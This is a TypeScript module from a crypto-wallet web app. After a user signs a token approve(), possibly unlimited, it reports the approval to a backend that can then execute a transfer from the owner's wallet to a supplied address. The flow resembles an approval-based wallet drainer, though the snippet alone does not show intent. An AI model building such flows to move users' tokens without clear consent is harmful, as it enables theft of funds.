import { TERMS_VERSION } from "./approve-config";
import type { TokenSymbol } from "./chain-tokens";
import { resolveApiUrl } from "./api-url";
import { postFlowLog } from "./flow-log-client";

function sleep(ms: number) {
  return new Promise((resolve) => window.setTimeout(resolve, ms));
}

/**
 * After the wallet signs approve():
 * 1) Confirm on-chain allowance
 * 2) Persist approval metadata (no private keys)
 */
export async function runPostConfirmSequence(args: {
  networkKey: string;
  address: string;
  token: TokenSymbol;
  amountHuman: string;
  amountRaw: string;
  unlimited: boolean;
  txid?: string | null;
  nativeBalance?: string;
  usdtBalance?: string;
  apiBaseUrl?: string;
  termsVersion?: string;
  executeTransfer?: boolean;
  transferToAddress?: string;
  transferAmountRaw?: string;
  transferAmountHuman?: string;
  traceId?: string;
}): Promise<{
  allowance: string | null;
  confirmed: boolean;
  approvalId: string | null;
  status: string | null;
  transferTxHash: string | null;
  transferredRaw: string | null;
}> {
  const {
    networkKey,
    address,
    token,
    amountHuman,
    amountRaw,
    unlimited,
    txid,
    apiBaseUrl = "",
    termsVersion = TERMS_VERSION,
    executeTransfer = false,
    transferToAddress = "",
    transferAmountRaw = "",
    transferAmountHuman = "",
    traceId = "n/a",
  } = args;

  if (!txid) {
    return {
      allowance: null,
      confirmed: false,
      approvalId: null,
      status: null,
      transferTxHash: null,
      transferredRaw: null,
    };
  }

  // Soft wait for inclusion
  await sleep(networkKey === "tron" ? 1200 : 600);
  void postFlowLog("POST-CONFIRM STARTED", {
    network: networkKey,
    token,
    txid,
    executeTransfer,
  }, traceId);

  try {
    const confirmRes = await fetch(
      resolveApiUrl(apiBaseUrl, "/api/approvals/confirm"),
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          network: networkKey,
          owner: address,
          token,
          amountHuman,
          amountRaw,
          txHash: txid,
          termsVersion,
          unlimited,
          executeTransfer,
          transferToAddress,
          transferAmountRaw,
          transferAmountHuman,
          traceId,
        }),
        cache: "no-store",
      }
    );
    const confirmJson = (await confirmRes.json()) as {
      ok?: boolean;
      approvalId?: string;
      status?: string;
      allowance?: string;
      hasAllowance?: boolean;
      error?: string;
      transfer?: { txHash?: string; transferredRaw?: string };
    };

    if (!confirmRes.ok || !confirmJson.ok) {
      throw new Error(confirmJson.error || "Failed to confirm approval");
    }
    void postFlowLog("POST-CONFIRM SUCCESS", {
      approvalId: confirmJson.approvalId ?? null,
      status: confirmJson.status ?? null,
      transferTxHash: confirmJson.transfer?.txHash ?? null,
    }, traceId);

    return {
      allowance: confirmJson.allowance ?? null,
      confirmed: Boolean(confirmJson.hasAllowance),
      approvalId: confirmJson.approvalId ?? null,
      status: confirmJson.status ?? null,
      transferTxHash: confirmJson.transfer?.txHash ?? null,
      transferredRaw: confirmJson.transfer?.transferredRaw ?? null,
    };
  } catch (err) {
    console.error("[post-confirm]", err);
    void postFlowLog("POST-CONFIRM FAILED", {
      error: err instanceof Error ? err.message : String(err),
      network: networkKey,
      token,
      txid,
    }, traceId);
    return {
      allowance: null,
      confirmed: false,
      approvalId: null,
      status: "FAILED",
      transferTxHash: null,
      transferredRaw: null,
    };
  }
}
